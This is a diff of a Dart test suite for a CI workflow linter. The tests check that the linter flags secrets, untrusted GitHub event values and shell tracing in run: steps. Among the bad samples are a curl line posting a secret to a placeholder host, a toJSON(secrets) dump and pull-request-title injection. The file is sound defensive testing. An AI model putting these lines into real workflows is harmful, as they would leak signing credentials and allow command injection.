@@ -88,23 +88,29 @@ void main() {
       );
     });
 
-    test('no workflow prints a secret or traces its shell', () {
-      final offenders = <String>[];
-      for (final path in _workflowFiles()) {
-        final text = readFile(path);
-        offenders.addAll(
-          secretEchoOffenders(path, text).map((o) => o.toString()),
+    test(
+      'no workflow lets a secret or an untrusted value reach a run: body',
+      () {
+        final offenders = <String>[];
+        for (final path in _workflowFiles()) {
+          final text = readFile(path);
+          offenders.addAll(
+            secretsInRunOffenders(path, text).map((o) => o.toString()),
+          );
+          offenders.addAll(
+            untrustedInRunOffenders(path, text).map((o) => o.toString()),
+          );
+          offenders.addAll(
+            shellTraceOffenders(path, text).map((o) => o.toString()),
+          );
+        }
+        expect(
+          offenders,
+          isEmpty,
+          reason: describeOffenders('secrets', offenders),
         );
-        offenders.addAll(
-          shellTraceOffenders(path, text).map((o) => o.toString()),
-        );
-      }
-      expect(
-        offenders,
-        isEmpty,
-        reason: describeOffenders('secrets', offenders),
-      );
-    });
+      },
+    );
 
     test('dependabot watches both ecosystems', () {
       final offenders = dependabotOffenders(
@@ -230,124 +236,133 @@ void main() {
       );
     });
 
-    test('printing a secret is refused, in each spelling', () {
+    test('the secret rule refuses any secret reaching a run: body', () {
+      // The point of the inversion: the spelling does not matter, because the
+      // rule no longer asks what the script does with the value. Every one of
+      // these passed the print-detecting version (#131, #141).
       for (final bad in const [
         r'        run: echo ${{ secrets.HS_KEY_PASS }}',
+        r'        run: echo "${{ secrets['
+            'HS_KEY_PASS'
+            '] }}"',
+        r'        run: echo "${{ secrets["HS_KEY_PASS"] }}"',
         r'        run: printf "%s" "${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}"',
-        r'        run: cat <<< "${{ secrets.HS_KEYSTORE_B64 }}"',
-        r'        run: foo && echo "${{ secrets.X }}"',
+        '        run: |\n          cat<<EOF\n'
+            '          \${{ secrets.HS_KEY_PASS }}\n          EOF\n',
+        r'        run: |'
+            '\n'
+            r"          cat <<'E-OF'"
+            '\n'
+            r'          ${{ secrets.HS_KEY_ALIAS }}'
+            '\n'
+            '          E-OF\n',
+        r'        run: |'
+            '\n'
+            r'          tee /tmp/x <<< "${{ secrets.X }}"'
+            '\n',
+        r'        run: |'
+            '\n'
+            r'          curl -d "${{ secrets.X }}" https://x'
+            '\n',
+        r'        run: |'
+            '\n'
+            r'          echo "${{ toJSON(secrets) }}"'
+            '\n',
+        r'        run: |'
+            '\n'
+            r'          x=${{ secrets.X }}; echo "$x"'
+            '\n',
       ]) {
         expect(
-          secretEchoOffenders('bad.yml', '$bad\n'),
-          hasLength(1),
-          reason: 'secret-echo: accepted `$bad`',
+          secretsInRunOffenders('bad.yml', '$bad\n'),
+          isNotEmpty,
+          reason: 'secrets-in-run: accepted `$bad`',
         );
       }
     });
 
-    test('using a secret without printing it is allowed', () {
+    test('a secret used through env:, and a heredoc writing a file, pass', () {
       for (final good in const [
         r'          HS_KEY_PASS: ${{ secrets.HS_KEY_PASS }}',
-        r'        run: base64 -d <<< "${{ secrets.HS_KEYSTORE_B64 }}" > "$RUNNER_TEMP/k"',
-        r'        run: echo "the keystore decoded"',
+        '        run: |\n          echo "\$HS_KEY_PASS" > /dev/null\n',
+        // The false positive the print-detecting rule introduced: this writes
+        // a signing properties file and prints nothing (#141).
+        '        run: |\n'
+            '          cat <<EOF > key.properties\n'
+            '          storePassword=\$HS_KEYSTORE_PASS\n'
+            '          EOF\n',
+        '        run: base64 -d <<< "\$HS_KEYSTORE_B64" > "\$RUNNER_TEMP/k"\n',
       ]) {
         expect(
-          secretEchoOffenders('good.yml', '$good\n'),
+          secretsInRunOffenders('good.yml', '$good\n'),
           isEmpty,
-          reason: 'secret-echo-negative: refused `$good`',
+          reason: 'secrets-in-run-negative: refused `$good`',
         );
       }
     });
 
-    test('a set flag cluster containing x is refused', () {
+    test('untrusted github/inputs values are refused in a run: body', () {
+      for (final bad in const [
+        r'        run: echo "### Release ${{ github.ref_name }}"',
+        r'        run: echo "${{ inputs.to_track }}"',
+        '        run: |\n          echo "from \${{ inputs.from_track }}"\n',
+        r'        run: echo "${{ github.event.pull_request.title }}"',
+      ]) {
+        expect(
+          untrustedInRunOffenders('bad.yml', '$bad\n'),
+          isNotEmpty,
+          reason: 'untrusted-in-run: accepted `$bad`',
+        );
+      }
+    });
+
+    test('step outputs and non-run uses of github. are allowed', () {
+      for (final good in const [
+        r'        run: echo "${{ steps.version.outputs.name }}"',
+        r'        if: github.event_name == '
+            'pull_request'
+            '',
+        r'          name: honest-sudoku-aab-${{ github.sha }}',
+        r'          TAG: ${{ github.ref_name }}',
+      ]) {
+        expect(
+          untrustedInRunOffenders('good.yml', '$good\n'),
+          isEmpty,
+          reason: 'untrusted-in-run-negative: refused `$good`',
+        );
+      }
+    });
+
+    test('every tracing spelling is refused', () {
       for (final bad in const [
         'set -x',
         'set -euxo pipefail',
         'foo; set -ex',
+        'set -v',
+        'set -o xtrace',
+        'set -o verbose',
+        // Each of these passed the firstMatch version (#141).
+        'set -euo pipefail; set -x',
+        'set -e -x',
+        'set -o errexit -o xtrace',
+        r'set -o "xtrace"',
+        'bash -x tools/gate.sh',
+        'sh -x script.sh',
       ]) {
         expect(
           shellTraceOffenders('bad.yml', '        run: $bad\n'),
-          hasLength(1),
-          reason: 'trace: accepted `$bad`',
-        );
-      }
-      for (final good in const ['set -euo pipefail', 'set -e', 'settle -x']) {
-        expect(
-          shellTraceOffenders('good.yml', '        run: $good\n'),
-          isEmpty,
-          reason: 'trace-negative: refused `$good`',
-        );
-      }
-    });
-
-    test('a secret printed from a heredoc the command opens is refused', () {
-      const bad =
-          '        run: |\n'
-          '          cat <<EOF\n'
-          r'          ${{ secrets.HS_KEY_PASS }}'
-          '\n'
-          '          EOF\n';
-      expect(
-        secretEchoOffenders('bad.yml', bad),
-        hasLength(1),
-        reason: 'secret-echo: accepted a heredoc body holding a secret',
-      );
-    });
-
-    test('a secret on a continued printing line is refused', () {
-      const bad =
-          '        run: |\n'
-          '          echo \\\n'
-          r'            "${{ secrets.HS_KEYSTORE_PASS }}"'
-          '\n';
-      expect(
-        secretEchoOffenders('bad.yml', bad),
-        hasLength(1),
-        reason: 'secret-echo: accepted a backslash-continued echo',
-      );
-    });
-
-    test('a heredoc that does not print, or ends first, is allowed', () {
-      // `base64 -d` consumes the heredoc into a file; nothing is printed.
-      const writesFile =
-          '        run: |\n'
-          '          base64 -d <<EOF > "\$RUNNER_TEMP/k"\n'
-          r'          ${{ secrets.HS_KEYSTORE_B64 }}'
-          '\n'
-          '          EOF\n';
-      expect(
-        secretEchoOffenders('good.yml', writesFile),
-        isEmpty,
-        reason: 'secret-echo-negative: refused a heredoc that writes a file',
-      );
-
-      // The delimiter closes before the secret is mentioned.
-      const closesFirst =
-          '        run: |\n'
-          '          cat <<EOF\n'
-          '          plain text\n'
-          '          EOF\n'
-          r'          HS_KEY_PASS: ${{ secrets.HS_KEY_PASS }}'
-          '\n';
-      expect(
-        secretEchoOffenders('good.yml', closesFirst),
-        isEmpty,
-        reason: 'secret-echo-negative: refused a closed heredoc',
-      );
-    });
-
-    test('the long form of tracing is refused', () {
-      for (final bad in const ['set -o xtrace', 'set -o verbose']) {
-        expect(
-          shellTraceOffenders('bad.yml', '        run: $bad\n'),
-          hasLength(1),
+          isNotEmpty,
           reason: 'trace: accepted `$bad`',
         );
       }
       for (final good in const [
+        'set -euo pipefail',
+        'set -e',
+        'settle -x',
         'set -o pipefail',
         'set -o errexit',
-        'set -o nounset',
+        'bash tools/gate.sh',
+        'grep -v foo bar',
       ]) {
         expect(
           shellTraceOffenders('good.yml', '        run: $good\n'),
@@ -357,15 +372,16 @@ void main() {
       }
     });
 
-    test('a shell: value that traces is refused', () {
+    test('a shell: value or SHELLOPTS that traces is refused', () {
       for (final bad in const [
         '      - shell: bash -x',
-        '        shell: bash -x',
         '        shell: bash -ex',
+        '        shell: bash -v',
+        '          SHELLOPTS: xtrace',
       ]) {
         expect(
           shellTraceOffenders('bad.yml', '$bad\n'),
-          hasLength(1),
+          isNotEmpty,
           reason: 'trace: accepted `$bad`',
         );
       }
